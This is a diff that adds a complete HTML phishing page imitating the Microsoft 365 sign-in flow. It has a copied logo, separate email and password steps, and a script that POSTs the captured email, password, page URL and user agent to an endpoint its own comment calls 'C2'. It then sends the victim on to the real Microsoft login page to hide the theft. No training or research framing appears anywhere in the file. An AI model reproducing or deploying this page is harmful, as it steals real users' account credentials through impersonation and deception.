@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+            background: #f2f2f2;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: #fff;
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        .logo {
+            margin-bottom: 16px;
+        }
+        .logo svg {
+            height: 24px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 12px;
+        }
+        .subtitle {
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 6px 10px;
+            font-size: 15px;
+            border: none;
+            border-bottom: 1px solid #666;
+            outline: none;
+            background: transparent;
+        }
+        .input-group input:focus {
+            border-bottom: 2px solid #0067b8;
+        }
+        .input-group input::placeholder {
+            color: #666;
+        }
+        .error {
+            color: #e81123;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        .forgot {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 24px;
+        }
+        .forgot:hover {
+            text-decoration: underline;
+        }
+        .btn {
+            width: 100%;
+            padding: 10px 20px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            font-size: 15px;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #005a9e;
+        }
+        .btn:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+        .options {
+            margin-top: 16px;
+        }
+        .options a {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 8px;
+        }
+        .options a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 24px;
+            font-size: 12px;
+            color: #666;
+        }
+        .back-btn {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            font-size: 13px;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        .back-btn:hover {
+            text-decoration: underline;
+        }
+        .user-display {
+            display: none;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 16px;
+            padding: 8px 12px;
+            background: #f3f2f1;
+            border-radius: 2px;
+        }
+        .user-display .avatar {
+            width: 24px;
+            height: 24px;
+            background: #0067b8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 12px;
+        }
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0067b8;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 12px;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Microsoft Logo -->
+        <div class="logo">
+            <table cellpadding="0" cellspacing="0" border="0">
+                <tr>
+                    <td style="vertical-align:middle;padding-right:12px">
+                        <table cellpadding="0" cellspacing="0" border="0">
+                            <tr>
+                                <td style="width:12px;height:12px;background:#f25022"></td>
+                                <td style="width:2px"></td>
+                                <td style="width:12px;height:12px;background:#7fba00"></td>
+                            </tr>
+                            <tr><td colspan="3" style="height:2px"></td></tr>
+                            <tr>
+                                <td style="width:12px;height:12px;background:#00a4ef"></td>
+                                <td style="width:2px"></td>
+                                <td style="width:12px;height:12px;background:#ffb900"></td>
+                            </tr>
+                        </table>
+                    </td>
+                    <td style="font-family:'Segoe UI',Arial,sans-serif;font-size:24px;color:#5e5e5e;font-weight:600;vertical-align:middle;letter-spacing:-0.5px">Microsoft</td>
+                </tr>
+            </table>
+        </div>
+
+        <!-- Step 1: Email -->
+        <div id="step1">
+            <h1>Sign in</h1>
+            <div class="input-group">
+                <input type="email" id="email" placeholder="Email, phone, or Skype" autocomplete="off">
+            </div>
+            <div class="error" id="emailError">Enter a valid email address, phone number, or Skype name.</div>
+            <a href="#" class="forgot">Can't access your account?</a>
+            <button class="btn" onclick="submitEmail()">Next</button>
+            <div class="options">
+                <a href="#">Sign-in options</a>
+            </div>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step2" style="display:none">
+            <div class="back-btn" onclick="goBack()" style="display:flex">← Back</div>
+            <div class="user-display" style="display:flex">
+                <div class="avatar" id="avatar">U</div>
+                <span id="userEmail"></span>
+            </div>
+            <h1>Enter password</h1>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="Password" autocomplete="off">
+            </div>
+            <div class="error" id="passError">Your account or password is incorrect. If you don't remember your password, <a href="#" style="color:#0067b8">reset it now</a>.</div>
+            <a href="#" class="forgot">Forgot password?</a>
+            <button class="btn" onclick="submitPassword()">Sign in</button>
+            <div class="options">
+                <a href="#">Other ways to sign in</a>
+            </div>
+        </div>
+
+        <!-- Loading -->
+        <div id="loading" class="loading">
+            <div class="spinner"></div>
+            <p>Signing you in...</p>
+        </div>
+
+        <div class="footer">
+            <a href="#" style="color:#666;text-decoration:none">Terms of use</a> · 
+            <a href="#" style="color:#666;text-decoration:none">Privacy & cookies</a>
+        </div>
+    </div>
+
+<script>
+let capturedEmail = '';
+
+function submitEmail() {
+    const email = document.getElementById('email').value.trim();
+    if (!email || !email.includes('@')) {
+        document.getElementById('emailError').style.display = 'block';
+        return;
+    }
+    document.getElementById('emailError').style.display = 'none';
+    capturedEmail = email;
+    
+    // Show password step
+    document.getElementById('step1').style.display = 'none';
+    document.getElementById('step2').style.display = 'block';
+    document.getElementById('userEmail').textContent = email;
+    document.getElementById('avatar').textContent = email[0].toUpperCase();
+    document.getElementById('password').focus();
+}
+
+function goBack() {
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('step1').style.display = 'block';
+    document.getElementById('passError').style.display = 'none';
+}
+
+function submitPassword() {
+    const password = document.getElementById('password').value;
+    if (!password) {
+        document.getElementById('passError').style.display = 'block';
+        return;
+    }
+    
+    // Show loading
+    document.getElementById('step2').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    
+    // Send credentials to C2
+    fetch('/api/creds', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+            email: capturedEmail,
+            password: password,
+            type: 'o365',
+            source: window.location.href,
+            ua: navigator.userAgent
+        })
+    }).finally(() => {
+        // Redirect to real Microsoft after delay
+        setTimeout(() => {
+            window.location.href = 'https://login.microsoftonline.com';
+        }, 2000);
+    });
+}
+
+// Enter key support
+document.getElementById('email').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') submitEmail();
+});
+document.getElementById('password').addEventListener('keypress', (e) => {
+    if (e.key === 'Enter') submitPassword();
+});
+</script>
+</body>
+</html>
